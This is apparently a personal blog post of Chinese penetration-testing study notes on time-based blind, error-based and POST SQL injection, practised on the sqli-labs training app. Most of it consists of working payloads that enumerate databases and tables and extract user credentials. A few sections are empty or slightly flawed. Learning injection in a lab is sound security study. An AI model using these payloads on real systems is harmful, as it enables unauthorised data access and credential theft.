{"title":"渗透测试笔记 - day12 时间盲注、报错注入与post注入","date":"2022-01-08T00:00:00.000Z","date_formatted":{"ll":"Jan 8, 2022","L":"01/08/2022","MM-DD":"01-08"},"link":"2022/01/08/渗透测试笔记 - day12 时间盲注、报错注入与post注入","updated":"2023-03-17T12:07:41.477Z","content":"<h2 id=\"时间盲注\">时间盲注<a title=\"#时间盲注\" href=\"#时间盲注\"></a></h2>\n<p>用于前端无状态返回时，用页面反应时间来判断是否存在注入点和进行盲注。</p>\n<p>payload：?id=1’ and sleep(2)– -</p>\n<p>使用burp的sniper模块快速注入。</p>\n<h3 id=\"练习：sqli-lab-less9\">练习：sqli-lab-less9<a title=\"#练习：sqli-lab-less9\" href=\"#练习：sqli-lab-less9\"></a></h3>\n<h4 id=\"判断闭合\">判断闭合<a title=\"#判断闭合\" href=\"#判断闭合\"></a></h4>\n<p>打开开发者工具监控正常连接回显时的延迟：200ms左右</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111923708.png\" alt=\"image-20220210222255210\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111923071.png\" alt=\"image-20220210222307870\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用sleep()判断闭合：</p>\n<p>无闭合：sleep未触发</p>\n<p>payload：?id=1 and sleep(3)-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111923880.png\" alt=\"image-20220210222450237\" loading=\"lazy\" class=\"φbp\"></p>\n<p>单引号闭合：sleep触发</p>\n<p>payload：?id=1’ and sleep(3)-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111923452.png\" alt=\"image-20220210222612825\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"爆破数据\">爆破数据<a title=\"#爆破数据\" href=\"#爆破数据\"></a></h4>\n<p>开启burp代理。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111923993.png\" alt=\"image-20220210214908751\" loading=\"lazy\" class=\"φbp\"></p>\n<p>输入参数，使用burp拦截。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111923596.png\" alt=\"image-20220210214943864\" loading=\"lazy\" class=\"φbp\"></p>\n<p>发送包文到intruder攻击器</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111923295.png\" alt=\"image-20220210215048593\" loading=\"lazy\" class=\"φbp\"></p>\n<p>加载payload，并设置变量</p>\n<p>payload：?id=1’ and if((substr((select database()),1,1)=‘a’),sleep(3),sleep(0))-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111923016.png\" alt=\"image-20220210224150349\" loading=\"lazy\" class=\"φbp\"></p>\n<p>设置爆破字典</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111923946.png\" alt=\"image-20220210224456064\" loading=\"lazy\" class=\"φbp\"></p>\n<p>开始攻击。</p>\n<p>查看reponse compelete time，找到执行完sleep后的返回结果。</p>\n<p>ps：burp不知道是设置的原因还是什么原因，repeater模块和intruder模块都收不到包了。查了一晚上也没查到，还没修好。所以最后一步没图了。。。</p>\n<h2 id=\"报错注入\">报错注入<a title=\"#报错注入\" href=\"#报错注入\"></a></h2>\n<h3 id=\"upadatexml()函数：\">upadatexml()函数：<a title=\"#upadatexml()函数：\" href=\"#upadatexml()函数：\"></a></h3>\n<p>更新文档中符合条件的节点的值。</p>\n<p>updatexml(XML_document,XPath_string,new_value)；</p>\n<p>XML_document：要更新的文档名。</p>\n<p>XPath_string：文档路径，Xpath语法</p>\n<p>new_value：string格式，替换数据。</p>\n<h4 id=\"sqli-less1：\">sqli-less1：<a title=\"#sqli-less1：\" href=\"#sqli-less1：\"></a></h4>\n<h5 id=\"查询所有数据库名：\">查询所有数据库名：<a title=\"#查询所有数据库名：\" href=\"#查询所有数据库名：\"></a></h5>\n<p>payload: ?id=1’ and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111923534.png\" alt=\"image-20220210234733928\" loading=\"lazy\" class=\"φbp\"></p>\n<h5 id=\"查询security的表名：\">查询security的表名：<a title=\"#查询security的表名：\" href=\"#查询security的表名：\"></a></h5>\n<p>payload: ?id=1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=‘security’),0x7e),1)-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924414.png\" alt=\"image-20220210150046730\" loading=\"lazy\" class=\"φbp\"></p>\n<h5 id=\"查询数据：\">查询数据：<a title=\"#查询数据：\" href=\"#查询数据：\"></a></h5>\n<p>payload：?id=1’ and updatexml(1,concat(0x7e,(select concat(username,‘==&gt;’,password) from security.users limit 3,1),0x7e),1)-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924638.png\" alt=\"image-20220210234844348\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"extractvalue()函数\">extractvalue()函数<a title=\"#extractvalue()函数\" href=\"#extractvalue()函数\"></a></h3>\n<p>从xml字符串提取值。</p>\n<p>extractvalue(xmlfrag,xpath_expr);</p>\n<p>接收两个字符串类型。</p>\n<h4 id=\"sqli-less1：-1\">sqli-less1：<a title=\"#sqli-less1：-1\" href=\"#sqli-less1：-1\"></a></h4>\n<h5 id=\"查询所有数据库名：-1\">查询所有数据库名：<a title=\"#查询所有数据库名：-1\" href=\"#查询所有数据库名：-1\"></a></h5>\n<p>payload: ?id=1’ and extractvalue(1,concat(‘~’,(select group_concat(schema_name) from information_schema.schemata),‘~’))-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924242.png\" alt=\"image-20220210234938023\" loading=\"lazy\" class=\"φbp\"></p>\n<p>查询security的表名：</p>\n<p>payload: ?id=1’ and extractvalue(1,concat(‘~’,(select group_concat(table_name) from information_schema.tables),‘~’))-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924698.png\" alt=\"image-20220210153743803\" loading=\"lazy\" class=\"φbp\"></p>\n<p>查询数据：</p>\n<p>payload：</p>\n<p>?id=1’ and extractvalue(1,concat(‘~’,(select concat(username,‘==&gt;’,‘password’) from security.users limit 3,1),‘~’))-- -</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924629.png\" alt=\"image-20220210235025461\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"exp-()函数\">exp ()函数<a title=\"#exp-()函数\" href=\"#exp-()函数\"></a></h3>\n<p>计算e的对数。</p>\n<p>使用exp()构造真假:</p>\n<p>1/exp(1111)</p>\n<h4 id=\"sqli-less1：-2\">sqli-less1：<a title=\"#sqli-less1：-2\" href=\"#sqli-less1：-2\"></a></h4>\n<h3 id=\"floor()函数\">floor()函数<a title=\"#floor()函数\" href=\"#floor()函数\"></a></h3>\n<p>向下取整。</p>\n<p>group by函数进行分组时，会创建虚拟表，由于其主键重复，所以报错。</p>\n<p>payload：select count(*) from users group by concat(database(),floor(rand(0)*2));</p>\n<p>爆所有数据库名：</p>\n<p>payload：select count(*) from users group by concat((select group_concat(schema_name) from information_schema.schemata),floor(rand(0)*2));</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924544.png\" alt=\"image-20220210235832598\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆security所有表名：</p>\n<p>payload：select count(*) from users group by concat((select group_concat(table_name) from information_schema.tables where table_schema=‘security’),floor(rand(0)*2));</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924010.png\" alt=\"image-20220211000003468\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆security.uses所有字段名：</p>\n<p>payload：select count(*) from users group by concat((select group_concat(column_name) from information_schema.columns where table_schema=‘security’ table_name=‘users’),floor(rand(0)*2));</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924853.png\" alt=\"image-20220211000437778\" loading=\"lazy\" class=\"φbp\"></p>\n<h4 id=\"sqli-less1：-3\">sqli-less1：<a title=\"#sqli-less1：-3\" href=\"#sqli-less1：-3\"></a></h4>\n<h2 id=\"post注入\">post注入<a title=\"#post注入\" href=\"#post注入\"></a></h2>\n<p>post传参时，使用burp抓包改参数实现注入。</p>\n<h3 id=\"sqli-lab-less-11\">sqli-lab less-11<a title=\"#sqli-lab-less-11\" href=\"#sqli-lab-less-11\"></a></h3>\n<p>前端输入参数：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924695.png\" alt=\"image-20220210165533116\" loading=\"lazy\" class=\"φbp\"></p>\n<p>burp抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924390.png\" alt=\"image-20220210165551831\" loading=\"lazy\" class=\"φbp\"></p>\n<p>拉到reapeter里改包发送爆数据库：</p>\n<p>payload：uname=123123’union select 1,database();-- &amp;passwd=admin&amp;submit=Submit</p>\n<p>返回security。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924065.png\" alt=\"image-20220210205539311\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆所有数据库：</p>\n<p>payload：uname=123123’union select 1,(select group_concat(schema_name) from information_schema.schemata);-- &amp;passwd=admin&amp;submit=Submit</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924198.png\" alt=\"image-20220210210320637\" loading=\"lazy\" class=\"φbp\"></p>\n<p>改包发送，爆security表名：</p>\n<p>payload：uname=123123’union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database());-- &amp;passwd=admin&amp;submit=Submit</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924491.png\" alt=\"image-20220210205854010\" loading=\"lazy\" class=\"φbp\"></p>\n<p>改包发送，爆security.users所有字段：</p>\n<p>payload：uname=123123’union select (select group_concat(column_name) from information_schema.columns where table_name=‘users’),1;#&amp;passwd=admin&amp;submit=Submit</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924506.png\" alt=\"image-20220210212625822\" loading=\"lazy\" class=\"φbp\"></p>\n<p>爆security.users第三行数据：</p>\n<p>payload：uname=123123’union select (select concat(id,‘–’,username,‘:’,password) from security.users limit 3,1),1;#&amp;passwd=admin&amp;submit=Submit</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111924952.png\" alt=\"image-20220210212908983\" loading=\"lazy\" class=\"φbp\"></p>\n","prev":{"title":"渗透测试笔记 - day13 其他注入技巧","link":"2022/01/15/渗透测试笔记 - day13 其他注入技巧"},"next":{"title":"渗透测试笔记 - day11 SQL联合(union)注入和盲注","link":"2022/01/07/渗透测试笔记 - day11 SQL联合(union)注入和盲注"},"plink":"https://Lq0ne.github.io/2022/01/08/渗透测试笔记 - day12 时间盲注、报错注入与post注入/","toc":[{"id":"时间盲注","title":"时间盲注","index":"1","children":[{"id":"练习：sqli-lab-less9","title":"练习：sqli-lab-less9","index":"1.1"}]},{"id":"报错注入","title":"报错注入","index":"2","children":[{"id":"upadatexml()函数：","title":"upadatexml()函数：","index":"2.1"},{"id":"extractvalue()函数","title":"extractvalue()函数","index":"2.2"},{"id":"exp-()函数","title":"exp ()函数","index":"2.3"},{"id":"floor()函数","title":"floor()函数","index":"2.4"}]},{"id":"post注入","title":"post注入","index":"3","children":[{"id":"sqli-lab-less-11","title":"sqli-lab less-11","index":"3.1"}]}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"January 8, 2022","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2022/01/08/渗透测试笔记 - day12 时间盲注、报错注入与post注入/\" title=\"渗透测试笔记 - day12 时间盲注、报错注入与post注入\">https://Lq0ne.github.io/2022/01/08/渗透测试笔记 - day12 时间盲注、报错注入与post注入/</a>"},"reading_time":"1050 words in 7 min"}